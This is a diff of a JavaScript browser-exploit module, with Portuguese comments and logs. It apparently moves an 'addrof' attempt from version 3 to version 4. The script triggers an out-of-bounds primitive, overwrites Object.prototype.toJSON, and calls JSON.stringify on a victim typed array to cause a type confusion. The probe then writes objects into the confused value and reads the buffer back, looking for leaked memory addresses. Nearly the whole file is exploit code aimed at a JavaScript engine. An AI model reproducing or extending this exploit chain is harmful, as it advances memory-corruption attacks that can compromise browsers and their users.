@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v3_InspectThis)
+// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v4_SeparateDetails)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
@@ -9,110 +9,88 @@ import {
     clearOOBEnvironment
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V3_INSPECTTHIS = "OriginalHeisenbug_TypedArrayAddrof_v3_InspectThis";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS = "OriginalHeisenbug_TypedArrayAddrof_v4_SeparateDetails";
 
 const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
 
-let toJSON_call_details_TA_IT = null; // IT for InspectThis
+// Objeto global APENAS para registrar detalhes da última chamada da sonda. NÃO é retornado pela sonda.
+let last_probe_call_details = null;
+
 let object_to_leak_A = null;
 let object_to_leak_B = null;
 let victim_typed_array_ref = null;
 
-// Sonda para TypedArray com tentativa de Addrof e introspecção do 'this' confuso
-function toJSON_TA_Probe_InspectThis() {
-    toJSON_call_details_TA_IT = {
-        probe_variant: "TA_Probe_Addrof_v3_InspectThis",
+function toJSON_TA_Probe_SeparateDetails() {
+    // Detalhes para ESTA chamada específica, que serão copiados para last_probe_call_details
+    let current_call_details = {
+        probe_variant: "TA_Probe_Addrof_v4_SeparateDetails",
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
-        probe_called: false,
+        probe_called: true, // Marcado como true no início
         this_was_victim_ref_at_confusion: null,
-        confused_this_keys: null,
-        confused_this_own_prop_names: null,
-        confused_this_buffer_prop: "N/A",
-        confused_this_byteLength_prop: "N/A",
+        // Campos de introspecção podem ser adicionados aqui se necessário
     };
 
     try {
-        toJSON_call_details_TA_IT.probe_called = true;
-        toJSON_call_details_TA_IT.this_type_in_toJSON = Object.prototype.toString.call(this);
+        current_call_details.this_type_in_toJSON = Object.prototype.toString.call(this);
         
-        logS3(`[${toJSON_call_details_TA_IT.probe_variant}] Sonda invocada. Tipo de 'this': ${toJSON_call_details_TA_IT.this_type_in_toJSON}. 'this' === victim_typed_array_ref? ${this === victim_typed_array_ref}`, "leak");
+        logS3(`[${current_call_details.probe_variant}] Sonda invocada. Tipo de 'this': ${current_call_details.this_type_in_toJSON}. 'this' === victim_typed_array_ref? ${this === victim_typed_array_ref}`, "leak");
 
-        if (toJSON_call_details_TA_IT.this_type_in_toJSON === '[object Object]') {
-            logS3(`[${toJSON_call_details_TA_IT.probe_variant}] TYPE CONFUSION DETECTADA para 'this' (agora [object Object])!`, "vuln");
+        if (current_call_details.this_type_in_toJSON === '[object Object]') {
+            logS3(`[${current_call_details.probe_variant}] TYPE CONFUSION DETECTADA para 'this' (agora [object Object])!`, "vuln");
             
             const is_this_victim = (this === victim_typed_array_ref);
-            toJSON_call_details_TA_IT.this_was_victim_ref_at_confusion = is_this_victim;
-            logS3(`[${toJSON_call_details_TA_IT.probe_variant}] No momento da confusão, 'this' === victim_typed_array_ref? ${is_this_victim}`, "info");
+            current_call_details.this_was_victim_ref_at_confusion = is_this_victim;
+            logS3(`[${current_call_details.probe_variant}] No momento da confusão, 'this' === victim_typed_array_ref? ${is_this_victim}`, "info");
 
-            // Introspecção do 'this' confuso
-            try {
-                toJSON_call_details_TA_IT.confused_this_keys = Object.keys(this);
-                logS3(`[${toJSON_call_details_TA_IT.probe_variant}] Confused 'this' keys: [${toJSON_call_details_TA_IT.confused_this_keys.join(', ')}]`, "leak");
-            } catch (e_keys) { logS3(`[${toJSON_call_details_TA_IT.probe_variant}] Error getting keys from confused 'this': ${e_keys.message}`, "warn"); }
-            
-            try {
-                toJSON_call_details_TA_IT.confused_this_own_prop_names = Object.getOwnPropertyNames(this);
-                logS3(`[${toJSON_call_details_TA_IT.probe_variant}] Confused 'this' ownPropertyNames: [${toJSON_call_details_TA_IT.confused_this_own_prop_names.join(', ')}]`, "leak");
-            } catch (e_own_props) { logS3(`[${toJSON_call_details_TA_IT.probe_variant}] Error getting ownPropertyNames from confused 'this': ${e_own_props.message}`, "warn"); }
-
-            try {
-                toJSON_call_details_TA_IT.confused_this_buffer_prop = String(this.buffer);
-                logS3(`[${toJSON_call_details_TA_IT.probe_variant}] Confused 'this.buffer': ${toJSON_call_details_TA_IT.confused_this_buffer_prop}`, "leak");
-            } catch (e_buffer) { toJSON_call_details_TA_IT.confused_this_buffer_prop = `Error: ${e_buffer.message}`; }
-            
-            try {
-                toJSON_call_details_TA_IT.confused_this_byteLength_prop = String(this.byteLength);
-                logS3(`[${toJSON_call_details_TA_IT.probe_variant}] Confused 'this.byteLength': ${toJSON_call_details_TA_IT.confused_this_byteLength_prop}`, "leak");
-            } catch (e_bl) { toJSON_call_details_TA_IT.confused_this_byteLength_prop = `Error: ${e_bl.message}`; }
-
-
-            logS3(`[${toJSON_call_details_TA_IT.probe_variant}] Tentando escritas addrof no 'this' ([object Object])...`, "warn");
+            logS3(`[${current_call_details.probe_variant}] Tentando escritas addrof no 'this' ([object Object])...`, "warn");
             if (object_to_leak_A) {
-                this[0] = object_to_leak_A; // Continuamos tentando, pode ser que funcione se for um objeto exótico
-                logS3(`[${toJSON_call_details_TA_IT.probe_variant}] Escrita de object_to_leak_A em this[0] (supostamente) realizada.`, "info");
+                this[0] = object_to_leak_A;
+                logS3(`[${current_call_details.probe_variant}] Escrita de object_to_leak_A em this[0] (supostamente) realizada.`, "info");
             }
             if (object_to_leak_B) {
                 this[1] = object_to_leak_B;
-                logS3(`[${toJSON_call_details_TA_IT.probe_variant}] Escrita de object_to_leak_B em this[1] (supostamente) realizada.`, "info");
+                logS3(`[${current_call_details.probe_variant}] Escrita de object_to_leak_B em this[1] (supostamente) realizada.`, "info");
             }
         } else if (this === victim_typed_array_ref) {
-            logS3(`[${toJSON_call_details_TA_IT.probe_variant}] 'this' é victim_typed_array_ref, mas o tipo é ${toJSON_call_details_TA_IT.this_type_in_toJSON}. Sem confusão ainda para este 'this'.`, "info");
+            logS3(`[${current_call_details.probe_variant}] 'this' é victim_typed_array_ref, mas o tipo é ${current_call_details.this_type_in_toJSON}. Sem confusão ainda para este 'this'.`, "info");
         } else {
-            logS3(`[${toJSON_call_details_TA_IT.probe_variant}] 'this' (tipo: ${toJSON_call_details_TA_IT.this_type_in_toJSON}) não é victim_typed_array_ref. Sem ação.`, "warn");
+            logS3(`[${current_call_details.probe_variant}] 'this' (tipo: ${current_call_details.this_type_in_toJSON}) não é victim_typed_array_ref. Sem ação.`, "warn");
         }
 
     } catch (e) {
-        toJSON_call_details_TA_IT.error_in_toJSON = `${e.name}: ${e.message}`;
-        logS3(`[${toJSON_call_details_TA_IT.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}`, "error");
+        current_call_details.error_in_toJSON = `${e.name}: ${e.message}`;
+        logS3(`[${current_call_details.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}`, "error");
     }
-    // Retorno padrão para que JSON.stringify não falhe se o 'this' for um objeto que ele espera que tenha toJSON.
-    // Se this for algo que JSON.stringify espera que retorne um valor serializável (ex: um objeto Date), 
-    // este retorno pode não ser o ideal, mas para ArrayBuffer/TypedArray/Object genérico, é ok.
-    return { minimal_TA_probe_executed_IT: true }; 
+    
+    // Atualiza o registrador global com os detalhes desta chamada
+    last_probe_call_details = { ...current_call_details };
+
+    // Retorna um objeto NOVO e SIMPLES sempre.
+    return { minimal_probe_did_execute: true }; 
 }
 
 
-export async function executeTypedArrayVictimAddrofTest_InspectThis() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V3_INSPECTTHIS}.triggerAndAddrof`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, InspectThis) e Tentativa de Addrof ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V3_INSPECTTHIS} Inic...`;
+export async function executeTypedArrayVictimAddrofTest_SeparateDetails() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS}.triggerAndAddrof`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, SeparateDetails) e Tentativa de Addrof ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS} Inic...`;
 
-    toJSON_call_details_TA_IT = null;
+    last_probe_call_details = null; // Reseta o registrador global
     victim_typed_array_ref = null;
-    object_to_leak_A = { marker: "ObjA_TA_v3it", id: Date.now() }; 
-    object_to_leak_B = { marker: "ObjB_TA_v3it", id: Date.now() + 567 };
+    object_to_leak_A = { marker: "ObjA_TA_v4sd", id: Date.now() }; 
+    object_to_leak_B = { marker: "ObjB_TA_v4sd", id: Date.now() + 678 };
 
     let errorCapturedMain = null;
-    let stringifyOutput = null;
-    let final_toJSON_details_capture = null; 
+    let stringifyOutput = null; // O que JSON.stringify realmente retorna
+    let captured_probe_details_after_stringify = null; // Cópia de last_probe_call_details
     
     let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Não tentado ou Heisenbug/escrita falhou." };
     let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Não tentado ou Heisenbug/escrita falhou." };
     
-    const fillPattern = 0.22334455667788;
+    const fillPattern = 0.33445566778899;
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
@@ -137,7 +115,7 @@ export async function executeTypedArrayVictimAddrofTest_InspectThis() {
         }
 
         logS3(`PASSO 2: underlying_ab (tamanho ${VICTIM_BUFFER_SIZE} bytes) e victim_typed_array_ref (Uint8Array) criados. View preenchida com ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
-        logS3(`   Tentando JSON.stringify em victim_typed_array_ref com ${toJSON_TA_Probe_InspectThis.name}...`, "test", FNAME_CURRENT_TEST);
+        logS3(`   Tentando JSON.stringify em victim_typed_array_ref com ${toJSON_TA_Probe_SeparateDetails.name}...`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
@@ -145,35 +123,32 @@ export async function executeTypedArrayVictimAddrofTest_InspectThis() {
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_TA_Probe_InspectThis,
+                value: toJSON_TA_Probe_SeparateDetails,
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_TA_Probe_InspectThis.name}.`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_TA_Probe_SeparateDetails.name}.`, "info", FNAME_CURRENT_TEST);
 
             logS3(`  Chamando JSON.stringify(victim_typed_array_ref)...`, "warn", FNAME_CURRENT_TEST);
             stringifyOutput = JSON.stringify(victim_typed_array_ref); 
             
-            if (toJSON_call_details_TA_IT) { // Captura o estado da ÚLTIMA chamada da sonda
-                final_toJSON_details_capture = { ...toJSON_call_details_TA_IT }; // Shallow copy
+            // Captura o estado do registrador global APÓS JSON.stringify ter completado.
+            // last_probe_call_details deve refletir a última chamada da sonda.
+            if (last_probe_call_details) {
+                captured_probe_details_after_stringify = { ...last_probe_call_details }; 
             }
 
-            logS3(`  JSON.stringify(victim_typed_array_ref) completou. Resultado (da sonda stringify): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
-            logS3(`  Detalhes da sonda capturados (toJSON_call_details_TA_IT - da última chamada): ${final_toJSON_details_capture ? JSON.stringify(final_toJSON_details_capture) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+            logS3(`  JSON.stringify(victim_typed_array_ref) completou. Stringify Output: ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Detalhes da ÚLTIMA chamada da sonda (capturados): ${captured_probe_details_after_stringify ? JSON.stringify(captured_probe_details_after_stringify) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
 
-            if (final_toJSON_details_capture && final_toJSON_details_capture.probe_called && final_toJSON_details_capture.this_type_in_toJSON === "[object Object]") {
-                logS3(`  HEISENBUG NO TYPEDARRAY CONFIRMADA (via detalhes capturados)! Tipo de 'this' na última sonda: ${final_toJSON_details_capture.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
-                if (final_toJSON_details_capture.this_was_victim_ref_at_confusion !== null) {
-                    logS3(`    Na última sonda confusa, 'this' === victim_typed_array_ref? ${final_toJSON_details_capture.this_was_victim_ref_at_confusion}`, "info");
+            if (captured_probe_details_after_stringify && 
+                captured_probe_details_after_stringify.probe_called && // Garante que a sonda foi chamada e os detalhes são dela
+                captured_probe_details_after_stringify.this_type_in_toJSON === "[object Object]") {
+                
+                logS3(`  HEISENBUG CONFIRMADA (via detalhes da última sonda)! Tipo de 'this' na última sonda: ${captured_probe_details_after_stringify.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
+                if (captured_probe_details_after_stringify.this_was_victim_ref_at_confusion !== null) {
+                    logS3(`    Na última sonda confusa, 'this' === victim_typed_array_ref? ${captured_probe_details_after_stringify.this_was_victim_ref_at_confusion}`, "info");
                 }
-                if (final_toJSON_details_capture.confused_this_keys) {
-                     logS3(`    Chaves do 'this' confuso (última sonda): [${final_toJSON_details_capture.confused_this_keys.join(', ')}]`, "leak");
-                }
-                 if (final_toJSON_details_capture.confused_this_own_prop_names) {
-                     logS3(`    OwnPropertyNames do 'this' confuso (última sonda): [${final_toJSON_details_capture.confused_this_own_prop_names.join(', ')}]`, "leak");
-                }
-                logS3(`    Propriedade 'buffer' do 'this' confuso: ${final_toJSON_details_capture.confused_this_buffer_prop}`, "leak");
-                logS3(`    Propriedade 'byteLength' do 'this' confuso: ${final_toJSON_details_capture.confused_this_byteLength_prop}`, "leak");
                 
                 logS3("PASSO 3: Verificando float64_view_on_underlying_ab APÓS Heisenbug e tentativas de escrita na sonda...", "warn", FNAME_CURRENT_TEST);
 
@@ -187,9 +162,9 @@ export async function executeTypedArrayVictimAddrofTest_InspectThis() {
                     (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                     logS3("  !!!! VALOR LIDO em view[0] PARECE UM PONTEIRO POTENCIAL (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                     addrof_result_A.success = true;
-                    addrof_result_A.message = "Heisenbug (TypedArray, InspectThis) confirmada E leitura de view[0] sugere um ponteiro para ObjA.";
+                    addrof_result_A.message = "Heisenbug (SeparateDetails) confirmada E leitura de view[0] sugere um ponteiro para ObjA.";
                 } else {
-                    addrof_result_A.message = "Heisenbug (TypedArray, InspectThis) confirmada, mas valor lido de view[0] não parece ponteiro para ObjA ou buffer não foi alterado.";
+                    addrof_result_A.message = "Heisenbug (SeparateDetails) confirmada, mas valor lido de view[0] não parece ponteiro para ObjA ou buffer não foi alterado.";
                     if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Valor é igual ao fillPattern inicial)";
                 }
 
@@ -203,32 +178,36 @@ export async function executeTypedArrayVictimAddrofTest_InspectThis() {
                     (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                     logS3("  !!!! VALOR LIDO em view[1] PARECE UM PONTEIRO POTENCIAL (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                     addrof_result_B.success = true;
-                    addrof_result_B.message = "Heisenbug (TypedArray, InspectThis) confirmada E leitura de view[1] sugere um ponteiro para ObjB.";
+                    addrof_result_B.message = "Heisenbug (SeparateDetails) confirmada E leitura de view[1] sugere um ponteiro para ObjB.";
                 } else {
-                    addrof_result_B.message = "Heisenbug (TypedArray, InspectThis) confirmada, mas valor lido de view[1] não parece ponteiro para ObjB ou buffer não foi alterado.";
+                    addrof_result_B.message = "Heisenbug (SeparateDetails) confirmada, mas valor lido de view[1] não parece ponteiro para ObjB ou buffer não foi alterado.";
                     if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Valor é igual ao fillPattern inicial)";
                 }
 
                 if (addrof_result_A.success || addrof_result_B.success) {
-                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V3_INSPECTTHIS}: Addr? SUCESSO!`;
+                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS}: Addr? SUCESSO!`;
                 } else {
-                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V3_INSPECTTHIS}: Heisenbug OK, Addr Falhou`;
+                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS}: Heisenbug OK, Addr Falhou`;
                 }
 
             } else {
-                let msg = "Heisenbug (TypedArray como [object Object]) não foi confirmada via detalhes capturados da sonda (última chamada).";
-                if(final_toJSON_details_capture && final_toJSON_details_capture.this_type_in_toJSON) msg += ` Tipo obs na última sonda: ${final_toJSON_details_capture.this_type_in_toJSON}.`;
-                else if (!final_toJSON_details_capture) msg += " Detalhes da sonda (final_toJSON_details_capture) são null.";
-                else if (final_toJSON_details_capture && !final_toJSON_details_capture.probe_called) msg += " Sonda não parece ter sido chamada (final_toJSON_details_capture.probe_called é false).";
+                let msg = "Heisenbug (TypedArray como [object Object]) não foi confirmada via detalhes da última chamada da sonda.";
+                if(captured_probe_details_after_stringify && captured_probe_details_after_stringify.this_type_in_toJSON) {
+                    msg += ` Tipo obs na última sonda: ${captured_probe_details_after_stringify.this_type_in_toJSON}.`;
+                } else if (!captured_probe_details_after_stringify) {
+                    msg += " Detalhes da sonda (captured_probe_details_after_stringify) são null.";
+                } else if (captured_probe_details_after_stringify && !captured_probe_details_after_stringify.probe_called) {
+                    msg += " Sonda não parece ter sido chamada (captured_probe_details_after_stringify.probe_called é false).";
+                }
                 addrof_result_A.message = msg; addrof_result_B.message = msg;
                 logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V3_INSPECTTHIS}: Heisenbug Falhou`;
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS}: Heisenbug Falhou`;
             }
 
         } catch (e_str) {
             errorCapturedMain = e_str;
             logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V3_INSPECTTHIS}: Stringify/Addrof ERR`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS}: Stringify/Addrof ERR`;
             addrof_result_A.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
             addrof_result_B.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
         } finally {
@@ -243,7 +222,7 @@ export async function executeTypedArrayVictimAddrofTest_InspectThis() {
         errorCapturedMain = e_outer_main;
         logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
         if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V3_INSPECTTHIS} FALHOU CRITICAMENTE`;
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V4_SEPDEETS} FALHOU CRITICAMENTE`;
         addrof_result_A.message = `Erro geral no teste: ${e_outer_main.name}`;
         addrof_result_B.message = `Erro geral no teste: ${e_outer_main.name}`;
     } finally {
@@ -261,13 +240,13 @@ export async function executeTypedArrayVictimAddrofTest_InspectThis() {
         object_to_leak_A = null;
         object_to_leak_B = null;
         victim_typed_array_ref = null;
-        toJSON_call_details_TA_IT = null; 
+        last_probe_call_details = null; 
     }
     return { 
         errorOccurred: errorCapturedMain, 
         potentiallyCrashed: false,
         stringifyResult: stringifyOutput, 
-        toJSON_details: final_toJSON_details_capture, 
+        toJSON_details: captured_probe_details_after_stringify, 
         addrof_A_attempt_result: addrof_result_A,
         addrof_B_attempt_result: addrof_result_B
     };
